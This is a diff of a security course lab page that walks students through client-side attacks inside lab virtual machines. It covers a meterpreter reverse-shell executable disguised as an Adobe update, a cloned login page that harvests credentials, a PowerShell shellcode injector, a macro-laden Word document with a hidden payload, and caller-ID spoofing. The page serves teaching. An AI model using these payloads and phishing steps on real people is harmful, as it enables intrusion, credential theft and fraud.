@@ -6,84 +6,118 @@ description: "Only amateurs attack machines; professionals target people."
 published: true
 ---
 
-Today, social engineering attacks represent a major primary vector for hackers. As Bruce Schneier said, “Only amateurs attack machines; professionals target people.”[1](https://www.schneier.com/crypto-gram-0010.html)  
-Further, client-side software represents a much larger attack surface than server-side software. For these reason, many of the major breaches you read about in the news began with a client-side attack.
+Today, social engineering attacks represent a major primary vector for hackers.
+As Bruce Schneier [said][1], “Only amateurs attack machines; professionals target people.”
+Further, client-side software represents a much larger attack surface than
+server-side software. For these reason, many of the major breaches you read
+about in the news began with a client-side attack.
 
-In this lab you’ll use two leading tools to perform client-side attacks: msfvenom and the Social Engineering Toolkit (SET). All of these attacks involve creating a malicious payload
-that you trick the user into executing. The Metasploit-Framework is used to create the payloads, and you are on your own to trick the user.
+[1]: https://www.schneier.com/crypto-gram-0010.html
+
+In this lab you’ll use two leading tools to perform client-side attacks:
+`msfvenom` and the Social Engineering Toolkit (SET). All of these attacks involve
+creating a malicious payload
+that you trick the user into executing. Both `msfvenom` and `set` use the Metasploit-Framework
+to create the payloads, and you are on your own to trick the user.
+
 
 # Part 1. MSFVenom with fake AdobeUpdate.exe
 
-In this section, you’ll use msfvenom to perform a client-side attack. Msfvenom can be used to turn Metasploit payloads into stand-alone executables that a user can be tricked into running. Your goal is to (1) create a malicious executable file, (2) host it on a web server, and (3) exploit a Windows 10 VM.
+In this section, you’ll use `msfvenom` to perform a client-side attack.
+Your goal is to (1) create a malicious executable file and (2) host it on a web server.
+Following this, you will play the role of the victim using the Windows VM, and
+you will (3) download and (4) run the payload, leading to the Windows VM being
+exploited.
 
-1.	Open your Kali Linux and Windows 10 VMs. Make sure that both are on the same subnet and can ping each other.
-2.	On Windows, make sure Windows Defender is turned off. Run:
-	* click the windows button on the bottom left of the desktop and searching for 'Defender' and choose 'Windows Defender Security Center'
-	* click 'Virus & Threat protection settings'
-	* move the 'Real-time protection' slider to the left.
+1.    Log in to Kali. Start up the Windows virtual machine.
 
-4.	In Kali, type `msfvenom --help-formats` to see a list of output formats that msfvenom supports. We’ll use the `-f exe` option to create a Windows executable.
-5.	In Kali, run the following command, all on one line:
+## Play the attacker
 
-        msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your Kali IP] -f exe > /tmp/AdobeUpdate.exe
+4.    In Kali, type `msfvenom --list formats` to see a list of output formats that
+      msfvenom supports. Examine the "Framework Executable Formats" section.
+      We’ll use `exe` optoin (via `-f exe`) option to create a Windows executable.
+5.    In Kali, run the following command, all on one line:
 
-    Where:
+          msfvenom -p windows/meterpreter/reverse_tcp LHOST=virbr1 -f exe > /tmp/AdobeUpdate.exe
 
-    * `-p`		Selects the payload
-    * `-f`		Selects the file type of the output executable
-    * `LHOST`   The IP of your Kali Linux VM
+      Where:
 
-6.	Verify that the output file is about 73802 bytes in size. If not, you may need to check that you entered the command correctly and run it again.
-10.	Run a msf handler to listen for the meterpreter reverse connection.
-    11. On Kali, open a new terminal window and enter `msfconsole`.
-    11.	Enter `use exploit/multi/handler`. Once you’ve switched to this exploit module, type `show info`. Note that this module “is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.” A stub adds additional functionality to other exploits.
-    12.	Enter `set PAYLOAD windows/meterpreter/reverse_tcp`.
-    13.	Enter `set LHOST [IP of Kali VM]`.
-    15.	Enter `exploit -j`.
+      * `-p` -- selects the payload to be the same one we used during the exploitation lab -- `meterpreter`.
+      * `-f exe` -- selects the file type of the output executable
+      * `LHOST=virbr1` -- sets LHOST to be the name of the adapter on which Kali has its 192.168.56.0/24 address. msfconsole should translate it for us.
+      * `> /tmp/AdobeUpdate.exe` -- redirects the output from running the `msfvenom` command into a file called `AdobeUpdate.exe`, stored in the `/tmp` directory.
 
-        <div class='alert alert-info' markdown='1'>
-        The `-j` option jobifies the exploit, or runs it as a job in the background. You can see a list of jobs running in the background by using the command jobs.
-        </div>    
+        <div class='alert alert-info'>This is not actually an Adobe Update! This is our payload, <em>disguised</em>.</div>
 
-        <div class='alert alert-info' markdown='1'>
-        Because <code>ExitOnSession</code> is set to <code>True</code> (the default for `exploit/multi/handler`; verify with `show advanced` from msfconsole), your handler will die after it gets one connection.
-        </div>
+6.    Verify that the output file is about 73802 bytes in size. If not, you may need to check that you entered the command correctly and run it again.
+10.   Run an `msf` handler to listen for the meterpreter reverse connection which will be incoming
+      when our malicious `AdobeUpdate.exe` payload file is executed.
 
-7.	Now, set up a web server to host your malicious file.
-    8.  Change directories to `/tmp` by entering `cd /tmp` in a kali terminal.
-    8.	See that the payload you generated earlier is in this directory: `ls`
-    9.  Now, from that directory, run this command:
+      11.   On Kali, open a new terminal window and enter `msfconsole`.
+      11.   Enter `use exploit/multi/handler`.
 
-            python -m SimpleHTTPServer 8888
+            Once you’ve switched to this exploit module, type `show info`.
+            Note that this module “is a stub that provides all of the features of
+            the Metasploit payload system to exploits that have been launched
+            outside of the framework.” A stub adds additional functionality to
+            other exploits.
+      12.   Enter `set PAYLOAD windows/meterpreter/reverse_tcp`.
+      13.   Enter `set LHOST virbr1`.
+      15.   Enter `exploit -j`.
 
-        This will start a web server on your kali instance, serving content from the current directory (`/tmp`).
+            <div class='alert alert-info'>
+            The <code>-j</code> option jobifies the exploit, or runs it as a job in the background. You can see a list of jobs running in the background by using the command jobs.
+            </div>
 
-    9.	On your Windows 10 VM, browse to:
+            <div class='alert alert-info'>
+            Because <code>ExitOnSession</code> is set to <code>True</code> (the default for <code>exploit/multi/handler</code>; verify with <code>show advanced</code> from msfconsole), your handler will die after it gets one connection.
+            </div>
 
-            http://[IP of your Kali VM]:8888/
+      The handler is now listening.
 
-        Verify that you can view the contents of `/tmp` on your Kali VM.
+7.    Now, we need to set up a way to deliver the payload to the victim.
+      Set up a web server to host your malicious file.
 
+      8.  Change directories to `/tmp` by entering `cd /tmp` in a kali terminal.
+      8.  Check that the payload you generated earlier is in this directory: run `ls`
+      9.  Now, from that directory, run the following command to use an http
+          webserver built into `python` to serve content from the current directory (`/tmp`)
+          on an arbitrary port - `8888`:
 
-16.	On your Windows 10 VM, in a web browser, download the malicious `AdobeUpdate.exe` file from the Python webserver and run the executable.
-    * If you use Edge/IE browser, download it, click "view downloads", right-click AdobeUpdate.exe, select "Run anyway"
-    * If a warning appears saying that Windows couldn’t access Windows SmartScreen, "more info", then click “Run anyway.”
-    * For the warning, “Do you want to allow this app from an unknown publisher…,” click “Yes.”
+              python3 -m http.server 8888
 
-17.	On your Kali VM, you should see in your msfconsole that “Command shell session `X` opened,” where X is the number of the new session. Type:
+## Play the victim
 
-        sessions -i [the number of the new session]
+16.  Now, switch to playing the role of the victim. On your Windows VM, using
+     Chrome, navigate to `http://192.168.56.101:8888`. Click `AdobeUpdate.exe` to
+     download it. Click it to execute it. On the "Windows protected your PC"
+     security dialog that appears, click "More info" and then "Run anyway."
 
-    This should open a connection to a meterpreter on the Windows VM.
+     {% include lab-image.html image='adobe-update-execute-more-info.png' %}
+
+     {% include lab-image.html image='adobe-update-execute-run-anyway.png' %}
+
+## Play the attacker again
+
+17.   On your Kali VM, you should see in your msfconsole that “Command shell session `X` opened,”
+      where X is the number of the new session. Congratulations!
+
+      Type:
+
+          sessions -i [the number of the new session]
+
+      This should open a connection to a meterpreter on the Windows VM.
 
 17. Run `shell` to drop down into a windows cmd prompt
-    18.	Type `whoami` to see the privileges that you are running under. Note that these are the privileges of the user of your Windows 10 VM.
-    19.	Run the command `netstat -n` to see a listing of open connections on the Windows server. Note the “ESTABLISHED” connection from the Windows VM to your Kali VM.
-    20. Return to your meterpreter shell (`exit`, I think).
-20. Carry out your nefarious purposes with the victim <i class='fa fa-birthday-cake'></i>
+    18.   Type `whoami` to see the privileges that you are running under.
+          Note that these are the privileges of the user of your Windows VM.
+    19.   Run the command `netstat -n` to see a listing of open connections on
+          the Windows server. Note the “ESTABLISHED” connection from the Windows VM to your Kali VM.
+    20.   Return to your meterpreter shell by running `exit` to leave the cmd prompt.
+20. Carry out any nefarious purpose you have in mind for the victim -- yourself <i class='fa fa-birthday-cake'></i>
 
 
-## <span class='label label-success'>Deliverable</span>
+## Deliverable
 
 Take a screenshot showing the output of running the following commands from your meterpreter session:
 
@@ -96,93 +130,104 @@ Take a screenshot showing the output of running the following commands from your
 The first command should show the process id related to your trojan pdf, and the second verifies that you are tied to that process.
 This establishes that you were successful in this exploit.
 
-The last three commands drop you into a windows shell where you can more easily establish your identity.
+The `shell` command drops you into a windows shell where you can more easily establish your identity.
 
-
-
-<div class='alert alert-info' markdown='1'><strong>Convenience! </strong> The above pattern of (1) generate a payload and (2) set up a handler to listen for a callback
-is common enough that SET gives you a higher-level interface for doing the same thing. For instance, the AdobeUpdate.exe steps in the earlier task could have been replaced with the following:
-
-From the SET main menu:
-
-* 1) Spear-Phishing Attack Vectors
-* 4) Create a Payload and Listener
-* 2) Windows Reverse_TCP Meterpreter
-* choose a LHOST and free PORT...
-* allow SET to set up a listener for you (`yes`)
-
-Nice, eh?
-</div>
-
+Once you have completed these steps, you can close your meterpreter session, but you may wish to leave
+your `/tmp` http.server running for later lab parts.
 
 
 # Part 2. Social Engineering Toolkit (SET) -- Site Cloner
 
 In this section, you’ll use the Social Engineering Toolkit (SET) to craft social engineering attacks.
 
-1.	Navigate to the `/opt/set` directory and run the command `./setoolkit` (don’t forget the `./`). Agree to the terms of service. You should see a screen like the following:
+1.   In a Kali shell, navigate to the `/opt/setoolkit` directory and run the command
+     `./setoolkit` (don’t forget the `./`). Agree to the terms of service. You should see a screen like the following:
 
-		{% include lab-image.html image='lab_11_2.png' width="50%" %}
+     {% include lab-image.html image='lab_11_2.png' width="50%" %}
 
-2.	Enter option `1` for social-engineering attacks. That should display this menu:
+2.   Enter option `1` for social-engineering attacks. That should display this menu:
 
-		{% include lab-image.html image='lab_11_3.png' width="50%" %}
+     {% include lab-image.html image='lab_11_3.png' width="50%" %}
 
-3.	Select option `2` for website attack vectors. The next menu will list the various web attack vectors:
+3.   Select option `2` for website attack vectors. The next menu will list the various web attack vectors:
 
-		{% include lab-image.html image='lab_11_4.png' width="50%" %}
+     {% include lab-image.html image='lab_11_4.png' width="50%" %}
 
-4.	Select number `3` for a credential harvesting attack. This brings you to the following screen:
+4.   Select number `3` for a credential harvesting attack. This brings you to the following screen:
 
-		{% include lab-image.html image='lab_11_5.png' width="50%" %}
+     {% include lab-image.html image='lab_11_5.png' width="50%" %}
 
-5.	Select option 2 to clone a target website. This is a very sophisticated feature that can clone almost any website. After you’ve selected this feature, you’ll need to set an IP address to host the cloned site. Set “IP address for the POST back in Harvester/Tabnabbing” to `192.168.55.101`, the IP address of Kali Linux for the host-only network. If SET already displays the correct IP address in brackets (e.g., "[192.168.55.101]"), just push enter.
+5.   Select option `2` to clone a target website. This is a very sophisticated feature that can clone
+     almost any website.
 
-    Now you get to choose the website to clone. Set the cloned website to `https://www.facebook.com`.
+     After you’ve selected this feature, you’ll need to set an IP address to host
+     the cloned site. Set “IP address for the POST back in Harvester/Tabnabbing” to `192.168.56.101`,
+     the IP address of Kali Linux for the host-only network. If SET already displays the correct IP address
+     in brackets (e.g., "[192.168.56.101]"), just push enter.
 
-    **Note:** Be sure you enter "https" and "www" in the Facebook URL.
+     Now you get to choose the website to clone. However, not all websites' login processes can be automatedly cloned.
+     One login page that was verified to work as of Novermber 2020 is `https://twitter.com/` -- set this address as the one
+     to clone.
 
-    You should see the message:
+     **Note:** Be sure you enter "https" in the URL.
 
-    	You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.
-		Press {return} if you understand what we're saying here.
+     If all has gone well, you should see a screen like the following:
+
+     {% include lab-image.html image='set-site-cloner.png' %}
+
+6.   Now it’s time to script the phishing message to send. At this point, an attacker would use a tool or service to send a
+     spoofed email. For simplicity, skip this step and instead send an email to your own email account with the message:
+
+     > “You are receiving this email because there is a problem with your account. Please go to twitter.com and login to verify your account."
+
+     Use rich text formatting to make `twitter.com` a hyperlink that points to the IP of your Kali VM: `http://192.168.56.101`.
+
+     Open the email in your Windows VM. When you receive the email, click the link.
+
+     <div class='alert alert-info'>Alternatively, simply <em>imagine</em> that you sent yourself the above email,
+     and visit
+     <code>http://192.168.56.101</code> from a browser within the Windows VM.</div>
+
+     You should be looking at whatever the current Twitter.com login page looks like -- a cloned copy!
+
+     {% include lab-image.html image='twitter-login.png' %}
+
+     **Note:** the address bar indicates the actual IP of the attacker. This is the biggest indication
+     that the site is forged. If this were a more sophisticated attempt, the attacker would obtain a
+     domain that looked similar to Twitter (like `twatter.com`). To easily obtain a phishing url,
+     an attacker could use a site like [http://freedns.afraid.org](http://freedns.afraid.org).
+
+8.   Enter fake credentials into the fields on the spoofed website, and click the login button on the website.
+     On your Kali VM, you should see something similar to this in your terminal window:
+
+     {% include lab-image.html image='lab_set_facebook.png' width="50%" %}
+
+     **Note:** You may need to scroll up in your terminal window to find your username and password. Some of the "possible username field
+     found" messages may be false positives. Just scroll up until you see your username and password.
 
 
-    Press enter to continue.  
-
-    If all has gone well, you should see a screen like the following:
-
-		{% include lab-image.html image='lab_11_6.png' width="50%" %}
-
-6.	Now it’s time to script the phishing message to send. At this point, an attacker would use a tool or service to send a spoofed email. For simplicity, skip this step and instead send an email to your own email account with the message:
-
-    > “You are receiving this email because there is a problem with your account. Please go to www.facebook.com and login to verify your account."
-
-    Use rich text formatting to make `www.facebook.com` a hyperlink that points to the IP of your Kali VM: `http://192.168.55.101`.
-
-7. Open the email in your Windows 10 VM. When you receive the email, click the link, which should forward you to this page:
-
-		{% include lab-image.html image='lab_11_7.png' width="50%" %}
-
-    **Note:** the address bar indicates the actual IP of the attacker. This is the biggest indication that the site is forged. If this were a more sophisticated attempt, the attacker would obtain a domain that looked similar to Facebook (like `facebook.webs.com`) For this, one could use a site like [http://freedns.afraid.org](http://freedns.afraid.org).
-
-8.	Enter fake credentials into the fields on the spoofed website. After you’ve filled the fields in with whatever words you wish, press the login button on the website. On your Kali VM, you should see something similar to this in your terminal window:
-
-		{% include lab-image.html image='lab_set_facebook.png' width="50%" %}
-
-    **Note:** You may need to scroll up in your terminal window to find your username and password. Some of the "possible username field found" messages are false positives. Just scroll up until you see your username and password.
-
-    **Note:** You may need to scroll up in your terminal window to find your username and password. Some of the "possible username field found" messages are false positives. Just scroll up until you see your username and password.
-
-## <span class='label label-success'>Deliverable</span>
+## Deliverable
 
 Take a screenshot of `setoolkit` reporting the capture of credentials you enter onto whatever site you spoofed. The screengrab should show:
 
-*   `POSSIBLE USERNAME FIELD FOUND: your.first.and.last.name (or something else clearly identifying you)`
-*   `POSSIBLE PASSWORD FIELD FOUND: whatever.password.you.entered`
+*   `POSSIBLE USERNAME FIELD FOUND: <your first and last name>`
+*   `POSSIBLE PASSWORD FIELD FOUND: <the password you entered>`
 
 
+<div class='alert alert-info' markdown='1'><strong>Convenience Tip!</strong> The pattern from Part 1 of
+(1) generate a payload and (2) set up a handler to listen for a callback
+is common enough that SET gives you a higher-level interface for doing the same thing.
+For instance, the AdobeUpdate.exe steps in the earlier task could have been replaced with the following in `setoolkit`:
 
+From the SET main menu:
+
+* Choose `1) Spear-Phishing Attack Vectors`
+* Choose `4) Create a Payload and Listener`
+* Choose `2) Windows Reverse_TCP Meterpreter`
+* choose a LHOST and free PORT...
+* allow SET to set up a listener for you (`yes`)
+
+</div>
 
 
 # Part 3. Social Engineering Toolkit (SET) -- PowerShell Shellcode Injector
@@ -191,30 +236,36 @@ PowerShell is a powerful scripting language built into the Windows operating sys
 execute it on Windows which opens a Meterpreter session on attacker’s machine.
 
 
-1.  Launch `setoolkit` if not already launched. From the main menu, choose `1` for `Social-Engineering Attacks`.
-2.  `9` for `PowerShell Attack Vectors`
-3.  within this option, you will find four different features. Select `1` for `PowerShell Alphanumeric Shellcode Injector`
+1.   Launch `setoolkit`. If it was already launched, close it and then launch it anew.
+1.   From the main menu, choose `1` for `Social-Engineering Attacks`.
+1.   Then, choose `9` for `PowerShell Attack Vectors`.
+3.   Within this submenu, select `1` for `PowerShell Alphanumeric Shellcode Injector`.
+4.   Enter your Kali VM IP address `192.168.56.101` and accept the default of port `443`. Choose `yes` to start the listener.
+     This will automatically open `msfconsole` and run some commands for you to set up a listener like you did manually in Part 1.
+5.   Open another terminal and navigate to `/root/.set/reports/powershell/`
+6.   From that directory, open the script using the leafpad command:
 
-[//]: # Needs image:   ![]({{ "/assets/images/" | relative_url }}){: .img-responsive width='50%'}
+          leafpad x86_powershell_injection.txt
 
-4.	Enter your Kali VM IP address and port `443`. Choose `yes` to start the listener. This will automatically open `msfconsole`, so it will take a minute or two.
 
-5.	While waiting, open another terminal and navigate to `/root/.set/reports/powershell/`
+     {% include lab-image.html image='powershell-save-payload.png' %}
 
-6.	From that directory, open the script using the leafpad command:
+7.   Copy the entire script you found on leafpad to the clipboard. On Windows, open a command line prompt (search for and run `cmd`).
 
-        apt install leafpad     # if necessary
-        leafpad x86_powershell_injection.txt
+     {% include lab-image.html image='windows-run-cmd.png' %}
 
-[//]: # Needs image:   ![]({{ "/assets/images/" | relative_url }}){: .img-responsive width='50%'}
+     Then, paste (right-click once, and be patient!) the script on the windows command line. Then press `enter`.
 
-7.	Copy the entire script you found on leafpad to the clipboard. On Windows, open a Paste the script on the windows command line as the figure depicts below. Then press enter.
-8.  You should see an opened Meterpreter session. Get the session id with `sessions` if you don't already see it, and then interact with that session with `sessions [id]`
-9.  **Optional:** you can save the entire script as a windows batch file (.bat), then trick the user to run that file.
+     The command prompt should disappear -- this is part of the payload script.
+
+     Shortly after, you should see an opened Meterpreter session. Congratulations! Get the session id with `sessions` if you don't already
+     see it, and then interact with that session with `sessions [id]`
+
+     **Optional:** you can save the entire script as a windows batch file (.bat), then trick the user to run that file.
 
 <div class='alert alert-info'><strong>Consider: </strong>What ways might you trick a user into running this script?</div>
 
-## <span class='label label-success'>Deliverable</span>
+## Deliverable
 
 Take a screenshot showing the output of running the following commands from your meterpreter session:
 
@@ -224,154 +275,154 @@ Take a screenshot showing the output of running the following commands from your
     echo "your first and last name"
     date /t
 
-The first command should show the process id related to your malicious powershell script, and the second verifies that you are tied to that process.
-This establishes that you were successful in this exploit.
 
-The last three commands drop you into a windows shell where you can more easily establish your identity.
+# Part 4. Create a Malicious Microsoft Word Document
+
+In this section, you will create a macro-enabled Microsoft Word file that opens a Meterpreter session on an attacker’s machine.
+Note that this exploits a _feature_ of Word -- not an inherent security vulnerability per se. For this reason, this attack
+vector will work as long as you can convince a user to open the Word file and enable some settings.
+
+The first step is to create the malicious macro-embedded Word document, acting as the attacker.
+You will need access to Microsoft Word in order
+to do this. This part of the lab includes instructions for installing an evaluation version of Microsoft Word into the Windows virtual
+machine on Kali.
+
+It is admittedly a bit odd to be, acting as an attacker, using the victim's machine to create a malicious document that we want the
+victim to run on that very machine, but so be it.
+
+Know that if you tried to use Word on a system running antivirus protection, it would likely prevent you from creating the malicious
+document, because it would detect that the document contained commands to launch a hidden shell (meterpreter).
+Rather than disable security settings on a system you rely on, use the lab's windows virtual machine for the document-creation
+portion of this lab.
+
+1.   In Kali, run the following command (all one line):
+
+          msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=virbr1 LPORT=7777 -e x86/shikata_ga_nai -f vba-exe > word-macro-exploit
+
+     This will save the exploit to a file called `word-macro-exploit`
+2.   Open `word-macro-exploit` using `leafpad`, and read the beginning of the output. It explains that the output is
+     divided into two sections: A "Macro" section and a "Payload" section.
+
+     We will need to put the "Macro" section into a VBA module attached to a Word document,
+     and the "Payload" section into the body text of the Word document.
+
+     The "Payload" is byte-code that the macro will read and write out into a file on the
+     victim machine, after which it will execute the newly-created executable.
+
+3.   In Kali, use `msfconsole` to spin up a listener that will wait for a connection from our Word meterpreter payload:
+
+          use exploit/multi/handler
+          set payload windows/meterpreter/reverse_tcp
+          set LPORT 7777
+          set LHOST virbr1
+          set ExitOnSession false
+          exploit -j
+
+4.   Install Word into the Windows virtual machine.
+
+     The version of Word that gets installed on the lab virtual machine only works for 5 days without a product key.
+     The first time that you install windows to your virtual machine, you can run the following from kali as root:
+
+         cd /root/vagrant-boxes/lab-windows-2019-vuln/
+         git pull
+         vagrant provision --provision-with install-windows
+
+     The installation process takes about two minutes.
+
+     If your activation grade period expires and you still need access to Word on your Windows VM, you can get a fresh start
+     by running the full vagrant destroy-up-provision cycle again, via running the following script **as root**:
+
+         wget -O - https://raw.githubusercontent.com/deargle/kali-xfce-gcp-qemu-packer/master/kali-pentest-lab/update-server2019.sh
+
+1.   Open Word. Accept whatever defaults for the welcoming prompts.
+
+1.   Enable the Developer tool access button on the Word ribbon:
+
+     * From Word's `File` tab, select `Options`.
+     * Then, select “Customize Ribbon” from the left-hand side menu
+     * Check the `Developer` checkbox (see screenshot below).
+
+     {% include lab-image.html image='lab_11_8.png' width="70%" %}
+
+2.  From the Developer ribbon, select “Visual Basic” to open the Visual Basic editor.
 
 
+    {% include lab-image.html image='word-ribbon-developer-visual-basic.png' %}
 
-# Part 4. Social Engineering Toolkit (SET) -- Malicious PDF
+    Inside the visual basic editor, right-click the document, select `Insert > Module`.
 
-This attack presumes that you still have the handler running listening for a connection from a `windows/meterpreter/reverse_tcp` payload, which was launched
-during the fake adobeupdate.exe section.
+    {% include lab-image.html image='word-vba-insert-module.png' %}
 
-Download and install a vulnerable version of Adobe Reader to the Windows 10 vm. v9.0 will do -- you can obtain it from [here](ftp://ftp.adobe.com/pub/adobe/reader/win/9.x/9.0/enu/AdbeRdr90_en_US.exe)
+    Copy all of the code from the "Macro" section of your `word-macro-exploit` file on Kali,
+    and paste it into your new VBA module:
 
-1. Launch `setoolkit` if not already launched. From the main menu:
-    * `1) Social-Engineering Attacks`
-    * `3) Infectious Media Generator`
-    * `1) File-Format Exploits`
-    * Enter the Kali IP address: `192.168.55.101`
-    * `13) Adobe PDF Embedded EXE Social Engineering`
-    * `2. Use built-in BLANK PDF for attack` (unless you're feeling adventurous, in which case you can create your own)
-    * `2) Windows Meterpreter Reverse_TCP`
-    * Accept default for payload listener LHOST by pressing enter.
-    * Accept default for port to connect back on by pressing enter.
-    * Let `SET` create a listener right now (`yes`)
+    {% include lab-image.html image='word-macro-exploit-copy-macro.png' %}
 
-2.  SET will have put the created payload in `/root/.set/template.pdf`. Your goal now is to get this pdf onto the victim machine.
-    If you still have the Python server running in the `/tmp` dir from the fake adobeupdate part of this lab, then you can just move this payload there and download it
-    to the victim machine as before. From a different Kali terminal than the `SET` one:
+    **Important for getting credit!** About 33 lines into the VBA code, you will see a line with a variable assignment some random gibberish that ends in `.exe`. You will need to know the
+    random gibberish later for the deliverable for this question. Example:
 
-        mv /root/.set/template.pdf /tmp
+    {% include lab-image.html image='word-macro-exploit-example-exe.png' %}
 
-    You can rename it to whatever you like.
+    "Save" the VB module, selecting a Word macro-enabled document (`.docm`). Close the VB editor.
 
-3.  On the Windows 10 VM, save the PDF to the desktop by browsing to `http://192.168.55.101:8888`. Open the downloaded file with Adobe Reader
+    {% include lab-image.html image='word-macro-exploit-save-as.png' %}
 
-    * Right-click the downloaded file > `Open with...` > `Adobe Reader 9.0`
+5.  Next, in the main body of the Word document, paste the payload hex code from the kali output textfile. Save the document again.
 
-4.  Adobe Reader will open a dialog asking you whether you want to save a file that the document is attempting to extract. Do so, <span class='label label-info'>saving the file to a locaiton such as the desktop</span>.
-5.  Adobe Reader will then ask if you want to run a script embedded in the pdf document. Let it do so.
-6.  You should now have a meterpreter session opened on kali. Interact with it, and continue pwn-age.
+    {% include lab-image.html image='word-macro-exploit-copy-payload.png' %}
 
+    At this point, the payload is fully functional. However, a good social engineer would disguise the document, to allay suspicion. The following ideas are subjective artistry.
 
-## <span class='label label-success'>Deliverable</span>
+    * Above the hex code, type a simple memo as the ostensible content of the memo.
+    * Highlight the hex code you pasted in and change the font size to “1” and the font color to white.
+    * Rename the file to something like “Sales Memo.”
+
+    This will make the hex code difficult to find for anyone who opens the document.
+
+6.  Test your malicious Word file by opening it on the Windows VM. If Word asks,
+    `enable macro content` (look for a yellow bar on the top
+    of the Word document window).
+
+    {% include lab-image.html image='word-macro-exploit-enable-content.png' %}
+
+    In the Kali VM, you should now see that a Meterpreter session has been opened to the host workstation.
+
+    If it doesn’t work, make sure that macros are enabled in your Word doc (Developer tab > Macro Security > Enable all macros).
+
+    **Optional:** Use the sendEmail command on Kali to send a spoofed email with the malicious Word file as an attachment. To see how the sendEmail command works, type `man sendEmail.`
+
+## Deliverable
 
 Take a screenshot showing the output of running the following commands from your meterpreter session:
 
-    pgrep pdf
+    ps -S <first few letters of your gibberish.txt>
     getpid
     shell
     echo "your first and last name"
     date /t
 
-The first command should show the process id related to your trojan pdf, and the second verifies that you are tied to that process.
-This establishes that you were successful in this exploit.
+This will establish that your random gibberish.exe is running, and that your meterpreter process is tied to that process.
 
-The last three commands drop you into a windows shell where you can more easily establish your identity.
+See the example below:
 
-
-
-<div class='alert alert-info'><strong>Optional:</strong> Explore! SET has much to offer. Just consider all the ways that you or members of your organization may be
-tricked into being compromised...</div>
+{% include lab-image.html image='word-macro-exploit-deliverable.png' %}
 
 
+# Part 5. Spoof your phone number
 
-# Part 5. Create a Malicious Microsoft Word Document
+In this section, you’ll use the app [SpoofCard](https://www.spoofcard.com) to spoof your phone number when making a call.
+This is a common technique used by social engineers to lend credibility to their calls when
+(vishing)[https://en.wikipedia.org/wiki/Voice_phishing].
 
-In this section, you will create a macro-enabled Microsoft Word file that opens a Meterpreter session on an attacker’s machine. Note that this is a feature of Word, and not a security vulnerability. For this reason, this attack vector will work as long as you can convince a user to open the Word file.
+{% include lab-image.html image='spoofcard.png' %}
 
-1.	In Kali, run the following command (all one line):
-
-        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=[kali ip addr] LPORT=7777 -e x86/shikata_ga_nai -f vba-exe > word-macro-exploit
-
-    This will save the exploit to a file called `word-macro-exploit`
-2.	`cat word-macro-exploit` and read the beginning of the output. It explains that the output is divided into two sections: A "Macro" section and a "Payload" section. Copy _all_ of the output from your terminal from this command, and paste it into a text file on your Windows VM (or onto a machine with Microsoft Word).
-
-3.	In Kali, run `msfconsole` and run the following commands:
-
-        use exploit/multi/handler
-        set payload windows/meterpreter/reverse_tcp
-        set LPORT 7777
-        set LHOST [IP of your Kali VM]
-        set ExitOnSession false
-        exploit -j
-
-    The above commands will cause Metasploit to listen on port 8080 for an incoming Meterpreter connection.
-
-
-4.	Open Word.
-
-    <div class='alert alert-info'>If you are using the Word 2007 preinstalled on my distributed VM, when it launches, you will be asked for a license activation key. Simply close
-    this dialog. You have trial-mode access.</div>
-
-    1.  First, enable the Developer tool access if you haven't already.
-
-        ## Enable Developer tool access in Word 2007
-
-        Click the circle office button in the top left > Word Options button towards bottom-right > "Popular" > enable checkbox for "Show Developer tab in the Ribbon"
-
-        ## Enable Developer tool access in Word 2010 and higher
-
-        From the File tab, select Options. Select “Customize Ribbon” from the left-hand side menu, and check the Developer checkbox (see screenshot below).
-
-				{% include lab-image.html image='lab_11_8.png' width="70%" %}
-
-    2.  From the Developer ribbon, select “Visual Basic” to open the Visual Basic editor.
-
-		[//]: # Needs image:   ![]({{ "/assets/images/lab_11_9.png" | relative_url }}){: .img-responsive width='70%'}
-
-        Inside the visual basic editor, right-click the document, select `Insert > Module`. Open the text file with the exploit code that you copied over from Kali.
-        Paste in all of the code in the "Macro" section (**but not the payload**) into the Visual Basic module you just inserted.
-
-        **Important for getting credit!** About 33 lines into the VBA code, you will see a line with a variable assignment some random gibberish that ends in `.exe`. You will need to know the random
-        gibberish later for the deliverable for this question.
-
-
-        Save it as a Word macro-enabled document (`.docm`) and close the VB editor.
-
-        [//]: # Needs image:   ![]({{ "/assets/images/lab_11_10.png" | relative_url }}){: .img-responsive width='70%'}
-
-5.  In the main body of the Word document, paste the payload hex code from the kali output. Above the hex code, type a simple memo as the ostensible content of the
-    memo. Next, highlight the hex code you pasted in and change the font size to “1” and the font color to white.
-    This will make the hex code difficult to find for anyone who opens the document. Finally, save the document as a macro-enabled Word file
-    (with a “.docm” extension). Name the file something like “Sales Memo.”
-
-    **Optional:** “In order to keep user suspicion low, try embedding the code in one of the many Word macro games that are available on the Internet. That way, the user is happily playing the game while you are working in the background. This gives you some extra time to migrate to another process if you are using Meterpreter as a payload.” From _Metasploit: The Pentester’s Guide_.
-
-6.  Test your malicious Word file by opening it on the Windows 10 VM. If Word asks, enable macro content. In the Kali VM, you should now see that a
-    Meterpreter session has been opened to the host workstation.
-    If it doesn’t work, make sure that macros are enabled in your Word doc (Developer tab > Macro Security > Enable all macros).
-
-    **Optional:** Use the sendEmail command on Kali to send a spoofed email with the malicious Word file as an attachment. To see how the sendEmail command works, type `man sendEmail.`
-
-## <span class='label label-success'>Deliverable</span>
-
-Two screenshots for this one:
-
-1. A screenshot of the line showing the random gibberish `.exe` variable.
-
-2.  Take a screenshot showing the output of running the following commands from your meterpreter session:
-
-        pgrep [the.random.gibberish.you.noted.earlier.exe]
-        getpid
-        shell
-        echo "your first and last name"
-        date /t
-
-    The first command should show the process id related to your trojan word doc, and the second verifies that you are tied to that process.
-    This establishes that you were successful in this exploit.
-
-    The last three commands drop you into a windows shell where you can more easily establish your identity.
+1. Download the SpoofCard app from the Apple App Store or Google Play Store.
+2. Open the app and press "Get Free credits."
+3. Enter your true phone number and email address. Select a 4-6 digit pin. Check the terms of service box, and press "Sign up."
+4. Enter the number of a friend you would like to call in the field "Number to call."
+5. Enter the number of a mutual friend that you would like to spoof in the field "Caller ID to Display".
+6. If you want, select the "Voice Changer" button to change your voice. Optionally, select the
+   "background noise" option and select a background noise.
+7. Select "Call". The app will show an intermediary SpoofCard phone number to call. Call that number to have the
+   SpoofCard service call your friend.
